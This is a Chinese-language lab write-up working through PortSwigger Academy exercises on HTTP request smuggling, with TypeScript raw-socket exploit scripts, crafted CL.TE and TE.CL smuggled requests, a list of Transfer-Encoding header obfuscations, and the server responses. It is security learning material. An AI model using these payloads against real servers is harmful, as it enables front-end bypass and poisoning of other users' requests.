---
title: HTTP request smuggling
description: HTTP request smuggling
---

## 前言

建議先讀過

1. [深入解說 HTTP message](../http/anatomy-of-an-http-message.md)
2. [HTTP2](../http/http-2.md)
3. [Transfer-Encoding](../http/transfer-encoding.md)

其實在寫 [Transfer-Encoding](../http/transfer-encoding.md) 這篇文章的時候，我就有在 RFC 9112 看到 [request smuggling](https://datatracker.ietf.org/doc/html/rfc9112#request.smuggling) 跟 [response splitting](https://datatracker.ietf.org/doc/html/rfc9112#response.splitting)，只不過 RFC 裡面不會教你怎麼 exploit 這些漏洞

[RFC 9112 #section-6.3](https://datatracker.ietf.org/doc/html/rfc9112#section-6.3) 有提到 `Transfer-Encoding` 跟 `Content-Length` 一起出現時的情境

```
If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 11.2) or response splitting (Section 11.1) and ought to be handled as an error.
```

<!-- PortSwigger 在 HTTP request smuggling 這個系列提供了非常多 Labs，讓我非常興奮，終於有機會可以學習到 CRLF Injection 跟 HTTP request smuggling 這兩個技術了  -->

## Lab: HTTP request smuggling, basic CL.TE vulnerability

| Dimension | Description                                                                  |
| --------- | ---------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/request-smuggling#cl-te-vulnerabilities |
| Lab       | https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te       |

我原本想用 NodeJS http 模組來寫 exploit，結果發現要用比較底層的 Socket 才能構造 HTTP Raw Request，第一次成功是用以下 exploit，但只能看到第一個 Response

```ts
import net from "net";
import tls from "tls";

function lab1() {
  return new Promise<true>((resolve) => {
    const url = new URL(
      "https://0a9f00d204680465817839ab00c900b4.web-security-academy.net/",
    );
    const smuggledBody = `0\r\n\r\nGPOST / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0\r\n\r\n`;
    const socket = net.connect(443, url.host);
    socket.on("connect", () => {
      const tlsSocket = tls.connect({ socket, servername: url.host });
      tlsSocket.on("secureConnect", () => {
        const body =
          "POST / HTTP/1.1\r\n" +
          `host: ${url.host}\r\n` +
          "transfer-encoding: chunked\r\n" +
          "content-type: text/plain\r\n" +
          "cookie: session=fc9liG4ABHCQbWwmn9SRI0e6W2kuuM2g\r\n" +
          `content-length: ${Buffer.byteLength(smuggledBody)}\r\n` +
          "\r\n" +
          smuggledBody;
        tlsSocket.write(body);
      });
      const chunks: Buffer[] = [];
      tlsSocket.on("data", (chunk) => {
        chunks.push(chunk);
      });
      tlsSocket.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        console.log(body);
      });
    });
  });
}

lab1();
```

後來模仿答案的 PoC，修改了我的程式碼，第一次的結尾多傳一個 `G`，第二次則是構造完整的 POST 請求，合併起來就是 GPOST

```ts
// import https from 'https'
import net from "net";
import tls from "tls";

async function lab1() {
  await sendRequest(1);
  await sendRequest(2);
}
function sendRequest(round: 1 | 2) {
  return new Promise<true>((resolve) => {
    const url = new URL(
      "https://0a9f00d204680465817839ab00c900b4.web-security-academy.net/",
    );
    const smuggledBody = `0\r\n\r\nG`;
    const socket = net.connect(443, url.host);
    socket.on("connect", () => {
      const tlsSocket = tls.connect({ socket, servername: url.host });
      tlsSocket.on("secureConnect", () => {
        const firstBody =
          "POST / HTTP/1.1\r\n" +
          `host: ${url.host}\r\n` +
          "transfer-encoding: chunked\r\n" +
          "content-type: text/plain\r\n" +
          "cookie: session=fc9liG4ABHCQbWwmn9SRI0e6W2kuuM2g\r\n" +
          `content-length: ${Buffer.byteLength(smuggledBody)}\r\n` +
          "\r\n" +
          smuggledBody;
        const secondBody = `POST / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0\r\n\r\n`;
        tlsSocket.write(round === 1 ? firstBody : secondBody);
      });
      const chunks: Buffer[] = [];
      tlsSocket.on("data", (chunk) => {
        chunks.push(chunk);
      });
      tlsSocket.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        console.log(body);
        resolve(true);
      });
    });
  });
}

lab1();
```

經過一番思考，終於理解為何

1. 因為題目有說 `The front-end server rejects requests that aren't using the GET or POST method.`
2. `tlsSocket.write` 要寫入正確的 HTTP Raw Request，才會正確進入 HTTP Server 的 Route
3. 承上，要構造 GPOST HTTP Method 的話，就是第一個請求的結尾寫入 `G`，第二次構造完整的 POST 請求

後來重新自己寫一個 exploit

```ts
// import https from 'https'
import net from "net";
import tls from "tls";

async function lab1() {
  await sendRequest(1);
  await sendRequest(2);
}
function sendRequest(round: 1 | 2) {
  return new Promise<true>((resolve) => {
    const url = new URL(
      "https://0ae200cc04c1b1a8814fed49003b0098.web-security-academy.net/",
    );
    const smuggledBody = `0\r\n\r\nGPOST / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0`;
    const socket = net.connect(443, url.host);
    socket.on("connect", () => {
      const tlsSocket = tls.connect({ socket, servername: url.host });
      tlsSocket.on("secureConnect", () => {
        const firstBody =
          "POST / HTTP/1.1\r\n" +
          `host: ${url.host}\r\n` +
          "transfer-encoding: chunked\r\n" +
          "content-type: text/plain\r\n" +
          `content-length: ${Buffer.byteLength(smuggledBody)}\r\n` +
          "\r\n" +
          smuggledBody;
        const secondBody = `\r\n\r\nGET / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0\r\n\r\n`;
        tlsSocket.write(round === 1 ? firstBody : secondBody);
      });
      const chunks: Buffer[] = [];
      tlsSocket.on("data", (chunk) => {
        chunks.push(chunk);
      });
      tlsSocket.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        console.log(body);
        resolve(true);
      });
    });
  });
}

lab1();
```

成功在第二個 Response 收到

```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

我的思路是

1. 第一個請求的 `smuggledBody` 不用 `\r\n\r\n` 結尾，這樣 GPOST 請求就不會發出
2. 第二個請求開頭先用 `\r\n\r\n`，讓 `smuggledBody` 變成完整的 GPOST 請求，之後再塞入一個正常的 GET 請求，讓這個 `tlsSocket.write` 寫入的資料可以正確進到 HTTP Server 的 Route

結論：用 Burp Suite Repeater 最方便，優點如下：

1. 完整控制 Raw HTTP Request
2. 自動處理 TLS handshake，只需專注 Layer 7 (http) 的細節
3. 沒有 NodeJS 複雜的 event 機制
4. 不用寫一堆 `\r\n`，只要按 Enter 鍵就是 `\r\n`

但記得要在 Settings > Network > HTTP 取消勾選 "Default to HTTP/2 if server supports it"

## Lab: HTTP request smuggling, basic TE.CL vulnerability

| Dimension | Description                                                                  |
| --------- | ---------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/request-smuggling#te-cl-vulnerabilities |
| Lab       | https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl       |

在 Burp Suite Repeater 構造

```
POST / HTTP/1.1
Host: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

55
GPOST / HTTP/1.1
Host: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net


0


```

其中，Content-Length: 4 => `55\r\n`

至於 55 則是

```ts
Buffer.byteLength(
  `GPOST / HTTP/1.1\r\nHost: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net\r\n\r\n`,
).toString(16);
```

這樣做雖然可以達到 HTTP Request Smuggling，但是沒辦法看到第二個 Response => 不是完美的 Solution

是說，TE.CL 的情境，要自己手動算 byte length，為了避免不同作業系統對於換行符號的差異（LF, CRLF），所以用 template literal 搭配 `\r\n` 算起來才會是正確的 byte length

後來我參考官方 Solution，花了 5 分鐘才讀懂這個設計，真的很精妙！我嘗試修改 Raw HTTP Request，讓其更好閱讀

```
POST / HTTP/1.1
Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
Content-Length: 4
Content-Type: text/plain
Transfer-Encoding: chunked

8e
GPOST / HTTP/1.1
Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
Content-Type: text/plain
Content-Length: 19

Only11Bytes
0


```

長度計算

```ts
Buffer.byteLength(`8e\r\n`).toString(10); // 4
Buffer.byteLength(
  `GPOST / HTTP/1.1\r\nHost: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net\r\nContent-Type: text/plain\r\nContent-Length: 19\r\n\r\nOnly11Bytes`,
).toString(16); // 8e
Buffer.byteLength(`Only11Bytes\r\n0\r\n\r\n`); // 18
```

刻意在 smuggledRequest 的 `Content-Length` 設定 19，讓第一個 HTTP Request 送出時，smuggledRequest 保持在 unprocessed；等到第二個 HTTP Request 送出時，smuggledRequest 就會變成

```
GPOST / HTTP/1.1
Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
Content-Type: text/plain
Content-Length: 19

Only11Bytes
0

P
```

只能說這招真的很精妙，理解的當下真的是覺得，能想到這個 Bypass 技巧的人類真的是大師～

## Lab: HTTP request smuggling, obfuscating the TE header

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header |
| Lab       | https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header                |

### 工具包

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

### 1. 嘗試 CL 正確，TE 沒有 `\r\n` 結尾

```
POST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 1

0
```

回傳

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 24

{"error":"Read timeout"}
```

### 2. 嘗試 CL 正確，TE 在 `\r\n` 之後多塞一個 X

```
POST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 6

0

X
```

回傳

```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

### 3. 嘗試 CL > 實際傳輸，TE 正確

```
POST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 10

0


```

回傳

```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

### 4. 嘗試 CL < 實際傳輸，TE 正確

```
POST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 1

0


```

正常回傳 200，如果 Frontend 是 CL 的話，那就不會把 `\r\n` 傳給 Backend，Backend 用 TE 就會等到 timeout => 但既然回傳 200，代表 Frontend 是用 TE，BE 是用 CL，並且會累積 `\r\n\r\n` 為 unprocessed

故判斷此情境為 TE.CL，回頭看

- [嘗試 1](#1-嘗試-cl-正確te-沒有-rn-結尾)，Frontend 瘋狂等 `\r\n` 等到 Read timeout => 合理
- [嘗試 2](#2-嘗試-cl-正確te-在-rn-之後多塞一個-x)，Frontend 把 `0\r\n` 傳給 Backend，Backend 用 CL 等到天荒地老，Frontend 由於收不到 Backend 的回應，回傳 Communication timed out => 合理
- [嘗試 3](#3-嘗試-cl--實際傳輸te-正確)，Frontend 把 `0\r\n` 傳給 Backend，Backend 用 CL 等到天荒地老，Frontend 由於收不到 Backend 的回應，回傳 Communication timed out => 合理

之後就用 [Lab: HTTP request smuggling, basic CL.TE vulnerability](#lab-http-request-smuggling-basic-clte-vulnerability) 的解法

```
POST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 4

74
GPOST / HTTP/1.1
Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
Content-Length: 19

Only11Bytes
0


```

發送兩次，成功解題～

## 參考資料

- https://portswigger.net/web-security/request-smuggling
